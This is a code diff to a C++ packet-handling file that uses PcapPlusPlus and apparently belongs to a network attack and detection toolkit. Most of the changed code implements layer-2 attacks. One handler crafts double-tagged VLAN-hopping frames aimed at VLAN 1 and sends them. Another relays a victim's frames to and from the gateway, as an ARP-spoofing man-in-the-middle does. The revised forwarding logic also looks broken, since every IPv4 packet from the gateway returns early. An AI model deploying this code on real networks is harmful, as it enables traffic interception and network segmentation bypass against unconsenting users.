@@ -1,3 +1,4 @@
+#include <netinet/in.h>
 #include "packet-receiver.hpp"
 
 void ashk::PacketReceiver::onPacketArrivesArpPoisoningDetection(pcpp::RawPacket *raw_packet, pcpp::PcapLiveDevice *dev,
@@ -43,7 +44,7 @@ void ashk::PacketReceiver::onPacketArrivesVlanHopping(pcpp::RawPacket *rawPacket
 
     auto *ethLayer = originalPacket.getLayerOfType<pcpp::EthLayer>();
     if (ethLayer == nullptr) {
-        std::cerr << "No Ethernet layer found!" << std::endl;
+//        std::cerr << "No Ethernet layer found!" << std::endl;
         return;
     }
 
@@ -66,18 +67,18 @@ void ashk::PacketReceiver::onPacketArrivesVlanHopping(pcpp::RawPacket *rawPacket
     pcpp::VlanLayer innerVlan(1,    // Target VLAN ID
                         0,      // Priority
                         0,      // DEI
-                        PCPP_ETHERTYPE_IP);
-
+                              ntohs(ethLayer->getEthHeader()->etherType));
+//std::cout<< ntohs(ethLayer->getEthHeader()->etherType)<<","<<PCPP_ETHERTYPE_IP<<std::endl;
     new_packet.addLayer(&new_ethlayer);
     new_packet.addLayer(&outerVlan);
     new_packet.addLayer(&innerVlan);
 
-    for(pcpp::Layer *layer=ethLayer->getNextLayer();layer!= nullptr;layer=layer->getNextLayer()){
-        uint8_t lArr[layer->getDataLen()];
-        layer->copyData(lArr);
-        auto *new_layer=new pcpp::PayloadLayer(lArr, sizeof(lArr));
-        new_packet.addLayer(new_layer);
-    }
+    pcpp::Layer *layer=ethLayer->getNextLayer();
+    uint8_t lArr[layer->getDataLen()];
+    layer->copyData(lArr);
+    auto *new_layer=new pcpp::PayloadLayer(lArr, sizeof(lArr));
+    new_packet.addLayer(new_layer);
+
     new_packet.computeCalculateFields();
     dev->sendPacket(&new_packet);
 }
@@ -87,8 +88,7 @@ void ashk::PacketReceiver::onPacketArrivesMITMForwarding(pcpp::RawPacket *raw_pa
     auto *data = static_cast<MITMForwardingCookie *>(cookie);
     pcpp::Packet packet(raw_packet);
 
-    if (!packet.isPacketOfType(pcpp::Ethernet) ||
-        !packet.isPacketOfType(pcpp::ARP))
+    if (!packet.isPacketOfType(pcpp::Ethernet))
         return;
 
     auto eth_layer = packet.getLayerOfType<pcpp::EthLayer>();
@@ -97,12 +97,18 @@ void ashk::PacketReceiver::onPacketArrivesMITMForwarding(pcpp::RawPacket *raw_pa
     if(eth_layer->getSourceMac()==dev->getMacAddress()){
         return;
     }
-    if (ip_layer->getSrcIPAddress()==data->victim_ip){
+    if (eth_layer->getSourceMac()==data->victim_mac){
         eth_layer->setDestMac(data->gateway_mac);
         dev->sendPacket(&packet);
         return;
     }
-    if(ip_layer->getDstIPAddress()==data->victim_ip){
+    if(eth_layer->getSourceMac()==data->gateway_mac){
+        if (packet.isPacketOfType(pcpp::IPv4)) {
+            if (ip_layer->getDstIPAddress() != data->victim_ip) {
+                return;
+            }
+            return;
+        }
         eth_layer->setDestMac(data->victim_mac);
         dev->sendPacket(&packet);
         return;
